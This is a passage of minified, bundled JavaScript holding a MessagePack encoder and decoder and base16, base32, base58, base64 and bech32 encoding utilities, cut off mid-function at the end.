                            this.pushArrayState(e),
                            this.complete();
                            continue e
                        }
                        t = []
                    } else if (221 === e) {
                        const e = this.readU32();
                        if (0 !== e) {
                            this.pushArrayState(e),
                            this.complete();
                            continue e
                        }
                        t = []
                    } else if (222 === e) {
                        const e = this.readU16();
                        if (0 !== e) {
                            this.pushMapState(e),
                            this.complete();
                            continue e
                        }
                        t = {}
                    } else if (223 === e) {
                        const e = this.readU32();
                        if (0 !== e) {
                            this.pushMapState(e),
                            this.complete();
                            continue e
                        }
                        t = {}
                    } else if (196 === e) {
                        const e = this.lookU8();
                        t = this.decodeBinary(e, 1)
                    } else if (197 === e) {
                        const e = this.lookU16();
                        t = this.decodeBinary(e, 2)
                    } else if (198 === e) {
                        const e = this.lookU32();
                        t = this.decodeBinary(e, 4)
                    } else if (212 === e)
                        t = this.decodeExtension(1, 0);
                    else if (213 === e)
                        t = this.decodeExtension(2, 0);
                    else if (214 === e)
                        t = this.decodeExtension(4, 0);
                    else if (215 === e)
                        t = this.decodeExtension(8, 0);
                    else if (216 === e)
                        t = this.decodeExtension(16, 0);
                    else if (199 === e) {
                        const e = this.lookU8();
                        t = this.decodeExtension(e, 1)
                    } else if (200 === e) {
                        const e = this.lookU16();
                        t = this.decodeExtension(e, 2)
                    } else {
                        if (201 !== e)
                            throw new Xs("Unrecognized type byte: ".concat(Ys(e)));
                        {
                            const e = this.lookU32();
                            t = this.decodeExtension(e, 4)
                        }
                    }
                    this.complete();
                    const r = this.stack;
                    for (; r.length > 0; ) {
                        const e = r.top();
                        if (e.type === ua) {
                            if (e.array[e.position] = t,
                            e.position++,
                            e.position !== e.size)
                                continue e;
                            t = e.array,
                            r.release(e)
                        } else {
                            if (e.type === da) {
                                if ("__proto__" === t)
                                    throw new Xs("The key __proto__ is not allowed");
                                e.key = this.mapKeyConverter(t),
                                e.type = ha;
                                continue e
                            }
                            if (e.map[e.key] = t,
                            e.readCount++,
                            e.readCount !== e.size) {
                                e.key = null,
                                e.type = da;
                                continue e
                            }
                            t = e.map,
                            r.release(e)
                        }
                    }
                    return t
                }
            }
            readHeadByte() {
                return -1 === this.headByte && (this.headByte = this.readU8()),
                this.headByte
            }
            complete() {
                this.headByte = -1
            }
            readArraySize() {
                const e = this.readHeadByte();
                switch (e) {
                case 220:
                    return this.readU16();
                case 221:
                    return this.readU32();
                default:
                    if (e < 160)
                        return e - 144;
                    throw new Xs("Unrecognized array type byte: ".concat(Ys(e)))
                }
            }
            pushMapState(e) {
                if (e > this.maxMapLength)
                    throw new Xs("Max length exceeded: map length (".concat(e, ") > maxMapLengthLength (").concat(this.maxMapLength, ")"));
                this.stack.pushMapState(e)
            }
            pushArrayState(e) {
                if (e > this.maxArrayLength)
                    throw new Xs("Max length exceeded: array length (".concat(e, ") > maxArrayLength (").concat(this.maxArrayLength, ")"));
                this.stack.pushArrayState(e)
            }
            decodeString(e, t) {
                return !this.rawStrings || this.stateIsMapKey() ? this.decodeUtf8String(e, t) : this.decodeBinary(e, t)
            }
            decodeUtf8String(e, t) {
                var r;
                if (e > this.maxStrLength)
                    throw new Xs("Max length exceeded: UTF-8 byte length (".concat(e, ") > maxStrLength (").concat(this.maxStrLength, ")"));
                if (this.bytes.byteLength < this.pos + t + e)
                    throw ma;
                const n = this.pos + t;
                let o;
                return o = this.stateIsMapKey() && null !== (r = this.keyDecoder) && void 0 !== r && r.canBeCached(e) ? this.keyDecoder.decode(this.bytes, n, e) : ca(this.bytes, n, e),
                this.pos += t + e,
                o
            }
            stateIsMapKey() {
                if (this.stack.length > 0) {
                    return this.stack.top().type === da
                }
                return !1
            }
            decodeBinary(e, t) {
                if (e > this.maxBinLength)
                    throw new Xs("Max length exceeded: bin length (".concat(e, ") > maxBinLength (").concat(this.maxBinLength, ")"));
                if (!this.hasRemaining(e + t))
                    throw ma;
                const r = this.pos + t
                  , n = this.bytes.subarray(r, r + e);
                return this.pos += t + e,
                n
            }
            decodeExtension(e, t) {
                if (e > this.maxExtLength)
                    throw new Xs("Max length exceeded: ext length (".concat(e, ") > maxExtLength (").concat(this.maxExtLength, ")"));
                const r = this.view.getInt8(this.pos + t)
                  , n = this.decodeBinary(e, t + 1);
                return this.extensionCodec.decode(n, r, this.context)
            }
            lookU8() {
                return this.view.getUint8(this.pos)
            }
            lookU16() {
                return this.view.getUint16(this.pos)
            }
            lookU32() {
                return this.view.getUint32(this.pos)
            }
            readU8() {
                const e = this.view.getUint8(this.pos);
                return this.pos++,
                e
            }
            readI8() {
                const e = this.view.getInt8(this.pos);
                return this.pos++,
                e
            }
            readU16() {
                const e = this.view.getUint16(this.pos);
                return this.pos += 2,
                e
            }
            readI16() {
                const e = this.view.getInt16(this.pos);
                return this.pos += 2,
                e
            }
            readU32() {
                const e = this.view.getUint32(this.pos);
                return this.pos += 4,
                e
            }
            readI32() {
                const e = this.view.getInt32(this.pos);
                return this.pos += 4,
                e
            }
            readU64() {
                const e = (t = this.view,
                r = this.pos,
                4294967296 * t.getUint32(r) + t.getUint32(r + 4));
                var t, r;
                return this.pos += 8,
                e
            }
            readI64() {
                const e = ta(this.view, this.pos);
                return this.pos += 8,
                e
            }
            readU64AsBigInt() {
                const e = this.view.getBigUint64(this.pos);
                return this.pos += 8,
                e
            }
            readI64AsBigInt() {
                const e = this.view.getBigInt64(this.pos);
                return this.pos += 8,
                e
            }
            readF32() {
                const e = this.view.getFloat32(this.pos);
                return this.pos += 4,
                e
            }
            readF64() {
                const e = this.view.getFloat64(this.pos);
                return this.pos += 8,
                e
            }
        }
        class wa {
            constructor(e) {
                var t, r, n, o, i, s, a, c;
                this.entered = !1,
                this.extensionCodec = null !== (t = null === e || void 0 === e ? void 0 : e.extensionCodec) && void 0 !== t ? t : na.defaultCodec,
                this.context = null === e || void 0 === e ? void 0 : e.context,
                this.useBigInt64 = null !== (r = null === e || void 0 === e ? void 0 : e.useBigInt64) && void 0 !== r && r,
                this.maxDepth = null !== (n = null === e || void 0 === e ? void 0 : e.maxDepth) && void 0 !== n ? n : 100,
                this.initialBufferSize = null !== (o = null === e || void 0 === e ? void 0 : e.initialBufferSize) && void 0 !== o ? o : 2048,
                this.sortKeys = null !== (i = null === e || void 0 === e ? void 0 : e.sortKeys) && void 0 !== i && i,
                this.forceFloat32 = null !== (s = null === e || void 0 === e ? void 0 : e.forceFloat32) && void 0 !== s && s,
                this.ignoreUndefined = null !== (a = null === e || void 0 === e ? void 0 : e.ignoreUndefined) && void 0 !== a && a,
                this.forceIntegerToFloat = null !== (c = null === e || void 0 === e ? void 0 : e.forceIntegerToFloat) && void 0 !== c && c,
                this.pos = 0,
                this.view = new DataView(new ArrayBuffer(this.initialBufferSize)),
                this.bytes = new Uint8Array(this.view.buffer)
            }
            clone() {
                return new wa({
                    extensionCodec: this.extensionCodec,
                    context: this.context,
                    useBigInt64: this.useBigInt64,
                    maxDepth: this.maxDepth,
                    initialBufferSize: this.initialBufferSize,
                    sortKeys: this.sortKeys,
                    forceFloat32: this.forceFloat32,
                    ignoreUndefined: this.ignoreUndefined,
                    forceIntegerToFloat: this.forceIntegerToFloat
                })
            }
            reinitializeState() {
                this.pos = 0
            }
            encodeSharedRef(e) {
                if (this.entered) {
                    return this.clone().encodeSharedRef(e)
                }
                try {
                    return this.entered = !0,
                    this.reinitializeState(),
                    this.doEncode(e, 1),
                    this.bytes.subarray(0, this.pos)
                } finally {
                    this.entered = !1
                }
            }
            encode(e) {
                if (this.entered) {
                    return this.clone().encode(e)
                }
                try {
                    return this.entered = !0,
                    this.reinitializeState(),
                    this.doEncode(e, 1),
                    this.bytes.slice(0, this.pos)
                } finally {
                    this.entered = !1
                }
            }
            doEncode(e, t) {
                if (t > this.maxDepth)
                    throw new Error("Too deep objects in depth ".concat(t));
                null == e ? this.encodeNil() : "boolean" === typeof e ? this.encodeBoolean(e) : "number" === typeof e ? this.forceIntegerToFloat ? this.encodeNumberAsFloat(e) : this.encodeNumber(e) : "string" === typeof e ? this.encodeString(e) : this.useBigInt64 && "bigint" === typeof e ? this.encodeBigInt64(e) : this.encodeObject(e, t)
            }
            ensureBufferSizeToWrite(e) {
                const t = this.pos + e;
                this.view.byteLength < t && this.resizeBuffer(2 * t)
            }
            resizeBuffer(e) {
                const t = new ArrayBuffer(e)
                  , r = new Uint8Array(t)
                  , n = new DataView(t);
                r.set(this.bytes),
                this.view = n,
                this.bytes = r
            }
            encodeNil() {
                this.writeU8(192)
            }
            encodeBoolean(e) {
                !1 === e ? this.writeU8(194) : this.writeU8(195)
            }
            encodeNumber(e) {
                !this.forceIntegerToFloat && Number.isSafeInteger(e) ? e >= 0 ? e < 128 ? this.writeU8(e) : e < 256 ? (this.writeU8(204),
                this.writeU8(e)) : e < 65536 ? (this.writeU8(205),
                this.writeU16(e)) : e < 4294967296 ? (this.writeU8(206),
                this.writeU32(e)) : this.useBigInt64 ? this.encodeNumberAsFloat(e) : (this.writeU8(207),
                this.writeU64(e)) : e >= -32 ? this.writeU8(224 | e + 32) : e >= -128 ? (this.writeU8(208),
                this.writeI8(e)) : e >= -32768 ? (this.writeU8(209),
                this.writeI16(e)) : e >= -2147483648 ? (this.writeU8(210),
                this.writeI32(e)) : this.useBigInt64 ? this.encodeNumberAsFloat(e) : (this.writeU8(211),
                this.writeI64(e)) : this.encodeNumberAsFloat(e)
            }
            encodeNumberAsFloat(e) {
                this.forceFloat32 ? (this.writeU8(202),
                this.writeF32(e)) : (this.writeU8(203),
                this.writeF64(e))
            }
            encodeBigInt64(e) {
                e >= BigInt(0) ? (this.writeU8(207),
                this.writeBigUint64(e)) : (this.writeU8(211),
                this.writeBigInt64(e))
            }
            writeStringHeader(e) {
                if (e < 32)
                    this.writeU8(160 + e);
                else if (e < 256)
                    this.writeU8(217),
                    this.writeU8(e);
                else if (e < 65536)
                    this.writeU8(218),
                    this.writeU16(e);
                else {
                    if (!(e < 4294967296))
                        throw new Error("Too long string: ".concat(e, " bytes in UTF-8"));
                    this.writeU8(219),
                    this.writeU32(e)
                }
            }
            encodeString(e) {
                const t = function(e) {
                    const t = e.length;
                    let r = 0
                      , n = 0;
                    for (; n < t; ) {
                        let o = e.charCodeAt(n++);
                        if (0 !== (4294967168 & o))
                            if (0 === (4294965248 & o))
                                r += 2;
                            else {
                                if (o >= 55296 && o <= 56319 && n < t) {
                                    const t = e.charCodeAt(n);
                                    56320 === (64512 & t) && (++n,
                                    o = ((1023 & o) << 10) + (1023 & t) + 65536)
                                }
                                r += 0 === (4294901760 & o) ? 3 : 4
                            }
                        else
                            r++
                    }
                    return r
                }(e);
                this.ensureBufferSizeToWrite(5 + t),
                this.writeStringHeader(t),
                ia(e, this.bytes, this.pos),
                this.pos += t
            }
            encodeObject(e, t) {
                const r = this.extensionCodec.tryToEncode(e, this.context);
                if (null != r)
                    this.encodeExtension(r);
                else if (Array.isArray(e))
                    this.encodeArray(e, t);
                else if (ArrayBuffer.isView(e))
                    this.encodeBinary(e);
                else {
                    if ("object" !== typeof e)
                        throw new Error("Unrecognized object: ".concat(Object.prototype.toString.apply(e)));
                    this.encodeMap(e, t)
                }
            }
            encodeBinary(e) {
                const t = e.byteLength;
                if (t < 256)
                    this.writeU8(196),
                    this.writeU8(t);
                else if (t < 65536)
                    this.writeU8(197),
                    this.writeU16(t);
                else {
                    if (!(t < 4294967296))
                        throw new Error("Too large binary: ".concat(t));
                    this.writeU8(198),
                    this.writeU32(t)
                }
                const r = la(e);
                this.writeU8a(r)
            }
            encodeArray(e, t) {
                const r = e.length;
                if (r < 16)
                    this.writeU8(144 + r);
                else if (r < 65536)
                    this.writeU8(220),
                    this.writeU16(r);
                else {
                    if (!(r < 4294967296))
                        throw new Error("Too large array: ".concat(r));
                    this.writeU8(221),
                    this.writeU32(r)
                }
                for (const n of e)
                    this.doEncode(n, t + 1)
            }
            countWithoutUndefined(e, t) {
                let r = 0;
                for (const n of t)
                    void 0 !== e[n] && r++;
                return r
            }
            encodeMap(e, t) {
                const r = Object.keys(e);
                this.sortKeys && r.sort();
                const n = this.ignoreUndefined ? this.countWithoutUndefined(e, r) : r.length;
                if (n < 16)
                    this.writeU8(128 + n);
                else if (n < 65536)
                    this.writeU8(222),
                    this.writeU16(n);
                else {
                    if (!(n < 4294967296))
                        throw new Error("Too large map object: ".concat(n));
                    this.writeU8(223),
                    this.writeU32(n)
                }
                for (const o of r) {
                    const r = e[o];
                    this.ignoreUndefined && void 0 === r || (this.encodeString(o),
                    this.doEncode(r, t + 1))
                }
            }
            encodeExtension(e) {
                if ("function" === typeof e.data) {
                    const t = e.data(this.pos + 6)
                      , r = t.length;
                    if (r >= 4294967296)
                        throw new Error("Too large extension object: ".concat(r));
                    return this.writeU8(201),
                    this.writeU32(r),
                    this.writeI8(e.type),
                    void this.writeU8a(t)
                }
                const t = e.data.length;
                if (1 === t)
                    this.writeU8(212);
                else if (2 === t)
                    this.writeU8(213);
                else if (4 === t)
                    this.writeU8(214);
                else if (8 === t)
                    this.writeU8(215);
                else if (16 === t)
                    this.writeU8(216);
                else if (t < 256)
                    this.writeU8(199),
                    this.writeU8(t);
                else if (t < 65536)
                    this.writeU8(200),
                    this.writeU16(t);
                else {
                    if (!(t < 4294967296))
                        throw new Error("Too large extension object: ".concat(t));
                    this.writeU8(201),
                    this.writeU32(t)
                }
                this.writeI8(e.type),
                this.writeU8a(e.data)
            }
            writeU8(e) {
                this.ensureBufferSizeToWrite(1),
                this.view.setUint8(this.pos, e),
                this.pos++
            }
            writeU8a(e) {
                const t = e.length;
                this.ensureBufferSizeToWrite(t),
                this.bytes.set(e, this.pos),
                this.pos += t
            }
            writeI8(e) {
                this.ensureBufferSizeToWrite(1),
                this.view.setInt8(this.pos, e),
                this.pos++
            }
            writeU16(e) {
                this.ensureBufferSizeToWrite(2),
                this.view.setUint16(this.pos, e),
                this.pos += 2
            }
            writeI16(e) {
                this.ensureBufferSizeToWrite(2),
                this.view.setInt16(this.pos, e),
                this.pos += 2
            }
            writeU32(e) {
                this.ensureBufferSizeToWrite(4),
                this.view.setUint32(this.pos, e),
                this.pos += 4
            }
            writeI32(e) {
                this.ensureBufferSizeToWrite(4),
                this.view.setInt32(this.pos, e),
                this.pos += 4
            }
            writeF32(e) {
                this.ensureBufferSizeToWrite(4),
                this.view.setFloat32(this.pos, e),
                this.pos += 4
            }
            writeF64(e) {
                this.ensureBufferSizeToWrite(8),
                this.view.setFloat64(this.pos, e),
                this.pos += 8
            }
            writeU64(e) {
                this.ensureBufferSizeToWrite(8),
                function(e, t, r) {
                    const n = r / 4294967296
                      , o = r;
                    e.setUint32(t, n),
                    e.setUint32(t + 4, o)
                }(this.view, this.pos, e),
                this.pos += 8
            }
            writeI64(e) {
                this.ensureBufferSizeToWrite(8),
                ea(this.view, this.pos, e),
                this.pos += 8
            }
            writeBigUint64(e) {
                this.ensureBufferSizeToWrite(8),
                this.view.setBigUint64(this.pos, e),
                this.pos += 8
            }
            writeBigInt64(e) {
                this.ensureBufferSizeToWrite(8),
                this.view.setBigInt64(this.pos, e),
                this.pos += 8
            }
        }
        function Ta(e) {
            return e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name
        }
        function Aa(e) {
            if (!Ta(e))
                throw new Error("Uint8Array expected");
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            if (r.length > 0 && !r.includes(e.length))
                throw new Error("Uint8Array expected of length " + r + ", got length=" + e.length)
        }
        function Ea(e, t) {
            return !!Array.isArray(t) && (0 === t.length || (e ? t.every((e => "string" === typeof e)) : t.every((e => Number.isSafeInteger(e)))))
        }
        function Pa(e) {
            if ("function" !== typeof e)
                throw new Error("function expected");
            return !0
        }
        function Ca(e, t) {
            if ("string" !== typeof t)
                throw new Error("".concat(e, ": string expected"));
            return !0
        }
        function Sa(e) {
            if (!Number.isSafeInteger(e))
                throw new Error("invalid integer: ".concat(e))
        }
        function Ia(e) {
            if (!Array.isArray(e))
                throw new Error("array expected")
        }
        function Ba(e, t) {
            if (!Ea(!0, t))
                throw new Error("".concat(e, ": array of strings expected"))
        }
        function xa(e, t) {
            if (!Ea(!1, t))
                throw new Error("".concat(e, ": array of numbers expected"))
        }
        function Oa() {
            const e = e => e
              , t = (e, t) => r => e(t(r));
            for (var r = arguments.length, n = new Array(r), o = 0; o < r; o++)
                n[o] = arguments[o];
            const i = n.map((e => e.encode)).reduceRight(t, e)
              , s = n.map((e => e.decode)).reduce(t, e);
            return {
                encode: i,
                decode: s
            }
        }
        function _a(e) {
            const t = "string" === typeof e ? e.split("") : e
              , r = t.length;
            Ba("alphabet", t);
            const n = new Map(t.map(( (e, t) => [e, t])));
            return {
                encode: n => (Ia(n),
                n.map((n => {
                    if (!Number.isSafeInteger(n) || n < 0 || n >= r)
                        throw new Error('alphabet.encode: digit index outside alphabet "'.concat(n, '". Allowed: ').concat(e));
                    return t[n]
                }
                ))),
                decode: t => (Ia(t),
                t.map((t => {
                    Ca("alphabet.decode", t);
                    const r = n.get(t);
                    if (void 0 === r)
                        throw new Error('Unknown letter: "'.concat(t, '". Allowed: ').concat(e));
                    return r
                }
                )))
            }
        }
        function Wa() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
            return Ca("join", e),
            {
                encode: t => (Ba("join.decode", t),
                t.join(e)),
                decode: t => (Ca("join.decode", t),
                t.split(e))
            }
        }
        function Ra(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "=";
            return Sa(e),
            Ca("padding", t),
            {
                encode(r) {
                    for (Ba("padding.encode", r); r.length * e % 8; )
                        r.push(t);
                    return r
                },
                decode(r) {
                    Ba("padding.decode", r);
                    let n = r.length;
                    if (n * e % 8)
                        throw new Error("padding: invalid, string should have whole number of bytes");
                    for (; n > 0 && r[n - 1] === t; n--) {
                        if ((n - 1) * e % 8 === 0)
                            throw new Error("padding: invalid, string has too much padding")
                    }
                    return r.slice(0, n)
                }
            }
        }
        function ka(e) {
            return Pa(e),
            {
                encode: e => e,
                decode: t => e(t)
            }
        }
        function Ma(e, t, r) {
            if (t < 2)
                throw new Error("convertRadix: invalid from=".concat(t, ", base cannot be less than 2"));
            if (r < 2)
                throw new Error("convertRadix: invalid to=".concat(r, ", base cannot be less than 2"));
            if (Ia(e),
            !e.length)
                return [];
            let n = 0;
            const o = []
              , i = Array.from(e, (e => {
                if (Sa(e),
                e < 0 || e >= t)
                    throw new Error("invalid integer: ".concat(e));
                return e
            }
            ))
              , s = i.length;
            for (; ; ) {
                let e = 0
                  , a = !0;
                for (let o = n; o < s; o++) {
                    const s = i[o]
                      , c = t * e
                      , l = c + s;
                    if (!Number.isSafeInteger(l) || c / t !== e || l - s !== c)
                        throw new Error("convertRadix: carry overflow");
                    const u = l / r;
                    e = l % r;
                    const d = Math.floor(u);
                    if (i[o] = d,
                    !Number.isSafeInteger(d) || d * r + e !== l)
                        throw new Error("convertRadix: carry overflow");
                    a && (d ? a = !1 : n = o)
                }
                if (o.push(e),
                a)
                    break
            }
            for (let a = 0; a < e.length - 1 && 0 === e[a]; a++)
                o.push(0);
            return o.reverse()
        }
        const Na = (e, t) => 0 === t ? e : Na(t, e % t)
          , Fa = (e, t) => e + (t - Na(e, t))
          , Ua = ( () => {
            let e = [];
            for (let t = 0; t < 40; t++)
                e.push(2 ** t);
            return e
        }
        )();
        function Da(e, t, r, n) {
            if (Ia(e),
            t <= 0 || t > 32)
                throw new Error("convertRadix2: wrong from=".concat(t));
            if (r <= 0 || r > 32)
                throw new Error("convertRadix2: wrong to=".concat(r));
            if (Fa(t, r) > 32)
                throw new Error("convertRadix2: carry overflow from=".concat(t, " to=").concat(r, " carryBits=").concat(Fa(t, r)));
            let o = 0
              , i = 0;
            const s = Ua[t]
              , a = Ua[r] - 1
              , c = [];
            for (const l of e) {
                if (Sa(l),
                l >= s)
                    throw new Error("convertRadix2: invalid data word=".concat(l, " from=").concat(t));
                if (o = o << t | l,
                i + t > 32)
                    throw new Error("convertRadix2: carry overflow pos=".concat(i, " from=").concat(t));
                for (i += t; i >= r; i -= r)
                    c.push((o >> i - r & a) >>> 0);
                const e = Ua[i];
                if (void 0 === e)
                    throw new Error("invalid carry");
                o &= e - 1
            }
            if (o = o << r - i & a,
            !n && i >= t)
                throw new Error("Excess padding");
            if (!n && o > 0)
                throw new Error("Non-zero padding: ".concat(o));
            return n && i > 0 && c.push(o >>> 0),
            c
        }
        function La(e) {
            Sa(e);
            return {
                encode: t => {
                    if (!Ta(t))
                        throw new Error("radix.encode input should be Uint8Array");
                    return Ma(Array.from(t), 256, e)
                }
                ,
                decode: t => (xa("radix.decode", t),
                Uint8Array.from(Ma(t, e, 256)))
            }
        }
        function ja(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            if (Sa(e),
            e <= 0 || e > 32)
                throw new Error("radix2: bits should be in (0..32]");
            if (Fa(8, e) > 32 || Fa(e, 8) > 32)
                throw new Error("radix2: carry overflow");
            return {
                encode: r => {
                    if (!Ta(r))
                        throw new Error("radix2.encode input should be Uint8Array");
                    return Da(Array.from(r), 8, e, !t)
                }
                ,
                decode: r => (xa("radix2.decode", r),
                Uint8Array.from(Da(r, e, 8, t)))
            }
        }
        function za(e) {
            return Pa(e),
            function() {
                try {
                    for (var t = arguments.length, r = new Array(t), n = 0; n < t; n++)
                        r[n] = arguments[n];
                    return e.apply(null, r)
                } catch (_l) {}
            }
        }
        Oa(ja(4), _a("0123456789ABCDEF"), Wa(""));
        const Va = Oa(ja(5), _a("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"), Ra(5), Wa(""))
          , Ha = (Oa(ja(5), _a("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"), Wa("")),
        Oa(ja(5), _a("0123456789ABCDEFGHIJKLMNOPQRSTUV"), Ra(5), Wa("")),
        Oa(ja(5), _a("0123456789ABCDEFGHIJKLMNOPQRSTUV"), Wa("")),
        Oa(ja(5), _a("0123456789ABCDEFGHJKMNPQRSTVWXYZ"), Wa(""), ka((e => e.toUpperCase().replace(/O/g, "0").replace(/[IL]/g, "1")))),
        ( () => "function" === typeof Uint8Array.from([]).toBase64 && "function" === typeof Uint8Array.fromBase64)())
          , qa = (e, t) => {
            Ca("base64", e);
            const r = t ? /^[A-Za-z0-9=_-]+$/ : /^[A-Za-z0-9=+/]+$/
              , n = t ? "base64url" : "base64";
            if (e.length > 0 && !r.test(e))
                throw new Error("invalid base64");
            return Uint8Array.fromBase64(e, {
                alphabet: n,
                lastChunkHandling: "strict"
            })
        }
          , Ga = (Ha || Oa(ja(6), _a("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"), Ra(6), Wa("")),
        Oa(ja(6), _a("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"), Wa("")),
        Ha || Oa(ja(6), _a("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"), Ra(6), Wa("")),
        Oa(ja(6), _a("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"), Wa("")),
        e => Oa(La(58), _a(e), Wa("")))
          , $a = (Ga("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"),
        Ga("123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"),
        Ga("rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz"),
        Oa(_a("qpzry9x8gf2tvdw0s3jn54khce6mua7l"), Wa("")))
          , Ka = [996825010, 642813549, 513874426, 1027748829, 705979059];
        function Za(e) {
            const t = e >> 25;
            let r = (33554431 & e) << 5;
            for (let n = 0; n < Ka.length; n++)
                1 === (t >> n & 1) && (r ^= Ka[n]);
            return r
        }
        function Ya(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 1;
            const n = e.length;
            let o = 1;
            for (let i = 0; i < n; i++) {
                const t = e.charCodeAt(i);
                if (t < 33 || t > 126)
                    throw new Error("Invalid prefix (".concat(e, ")"));
                o = Za(o) ^ t >> 5
            }
            o = Za(o);
            for (let i = 0; i < n; i++)
                o = Za(o) ^ 31 & e.charCodeAt(i);
            for (let i of t)
                o = Za(o) ^ i;
            for (let i = 0; i < 6; i++)
                o = Za(o);
            return o ^= r,
            $a.encode(Da([o % Ua[30]], 30, 5, !1))
        }
        function Ja(e) {
            const t = "bech32" === e ? 1 : 734539939
              , r = ja(5)
              , n = r.decode
              , o = r.encode
              , i = za(n);
            function s(e, r) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 90;
                Ca("bech32.encode prefix", e),
                Ta(r) && (r = Array.from(r)),
                xa("bech32.encode", r);
                const o = e.length;
                if (0 === o)
                    throw new TypeError("Invalid prefix length ".concat(o));
                const i = o + 7 + r.length;
                if (!1 !== n && i > n)
                    throw new TypeError("Length ".concat(i, " exceeds limit ").concat(n));
                const s = e.toLowerCase()
                  , a = Ya(s, r, t);
                return "".concat(s, "1").concat($a.encode(r)).concat(a)
            }
            function a(e) {
                let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 90;
                Ca("bech32.decode input", e);
                const n = e.length;
                if (n < 8 || !1 !== r && n > r)
                    throw new TypeError("invalid string length: ".concat(n, " (").concat(e, "). Expected (8..").concat(r, ")"));
                const o = e.toLowerCase();
                if (e !== o && e !== e.toUpperCase())
                    throw new Error("String must be lowercase or uppercase");
                const i = o.lastIndexOf("1");
                if (0 === i || -1 === i)
                    throw new Error('Letter "1" must be present between prefix and data only');
                const s = o.slice(0, i)
                  , a = o.slice(i + 1);
                if (a.length < 6)
                    throw new Error("Data must be at least 6 characters long");
                const c = $a.decode(a).slice(0, -6)
                  , l = Ya(s, c, t);
                if (!a.endsWith(l))
                    throw new Error("Invalid checksum in ".concat(e, ': expected "').concat(l, '"'));
                return {
                    prefix: s,
                    words: c
                }
            }
            return {
                encode: s,
                decode: a,
                encodeFromBytes: function(e, t) {
                    return s(e, o(t))
                },
                decodeToBytes: function(e) {
                    const {prefix: t, words: r} = a(e, !1);
                    return {
                        prefix: t,
                        words: r,
                        bytes: n(r)
                    }
                },
                decodeUnsafe: za(a),
                fromWords: n,
                fromWordsUnsafe: i,
                toWords: o
            }
        }
        Ja("bech32"),
        Ja("bech32m");
        const Xa = {
            encode: e => (Aa(e),
            e.toHex()),
            decode: e => (Ca("hex", e),
            Uint8Array.fromHex(e))
        };
        ( () => "function" === typeof Uint8Array.from([]).toHex && "function" === typeof Uint8Array.fromHex)() || Oa(ja(4), _a("0123456789abcdef"), Wa(""), ka((e => {
            if ("string" !== typeof e || e.length % 2 !== 0)
                throw new TypeError("hex.decode: expected string, got ".concat(typeof e, " with length ").concat(e.length));
            return e.toLowerCase()
        }
        )));
        function Qa(e) {
            return null != globalThis.Buffer ? new Uint8Array(e.buffer,e.byteOffset,e.byteLength) : e
        }
        function ec() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
            return null != globalThis.Buffer && null != globalThis.Buffer.allocUnsafe ? Qa(globalThis.Buffer.allocUnsafe(e)) : new Uint8Array(e)
        }
        function tc(e, t) {
            t || (t = e.reduce(( (e, t) => e + t.length), 0));
            const r = ec(t);
            let n = 0;
            for (const o of e)
                r.set(o, n),
                n += o.length;
            return Qa(r)
        }
        var rc = function(e, t) {
            if (e.length >= 255)
                throw new TypeError("Alphabet too long");
            for (var r = new Uint8Array(256), n = 0; n < r.length; n++)
                r[n] = 255;
            for (var o = 0; o < e.length; o++) {
                var i = e.charAt(o)
                  , s = i.charCodeAt(0);
                if (255 !== r[s])
                    throw new TypeError(i + " is ambiguous");
                r[s] = o
            }
            var a = e.length
              , c = e.charAt(0)
              , l = Math.log(a) / Math.log(256)
              , u = Math.log(256) / Math.log(a);
            function d(e) {
                if ("string" !== typeof e)
                    throw new TypeError("Expected String");
                if (0 === e.length)
                    return new Uint8Array;
                var t = 0;
                if (" " !== e[t]) {
                    for (var n = 0, o = 0; e[t] === c; )
                        n++,
                        t++;
                    for (var i = (e.length - t) * l + 1 >>> 0, s = new Uint8Array(i); e[t]; ) {
                        var u = r[e.charCodeAt(t)];
                        if (255 === u)
                            return;
                        for (var d = 0, h = i - 1; (0 !== u || d < o) && -1 !== h; h--,
                        d++)
                            u += a * s[h] >>> 0,
                            s[h] = u % 256 >>> 0,
                            u = u / 256 >>> 0;
                        if (0 !== u)
                            throw new Error("Non-zero carry");
                        o = d,
                        t++
                    }
                    if (" " !== e[t]) {
                        for (var f = i - o; f !== i && 0 === s[f]; )
                            f++;
                        for (var p = new Uint8Array(n + (i - f)), g = n; f !== i; )
                            p[g++] = s[f++];
                        return p
                    }
                }
            }
            return {
                encode: function(t) {
                    if (t instanceof Uint8Array || (ArrayBuffer.isView(t) ? t = new Uint8Array(t.buffer,t.byteOffset,t.byteLength) : Array.isArray(t) && (t = Uint8Array.from(t))),
                    !(t instanceof Uint8Array))
                        throw new TypeError("Expected Uint8Array");
                    if (0 === t.length)
                        return "";
                    for (var r = 0, n = 0, o = 0, i = t.length; o !== i && 0 === t[o]; )
                        o++,
                        r++;
                    for (var s = (i - o) * u + 1 >>> 0, l = new Uint8Array(s); o !== i; ) {
                        for (var d = t[o], h = 0, f = s - 1; (0 !== d || h < n) && -1 !== f; f--,
                        h++)
                            d += 256 * l[f] >>> 0,
                            l[f] = d % a >>> 0,
                            d = d / a >>> 0;
                        if (0 !== d)
                            throw new Error("Non-zero carry");
                        n = h,
                        o++
                    }
                    for (var p = s - n; p !== s && 0 === l[p]; )
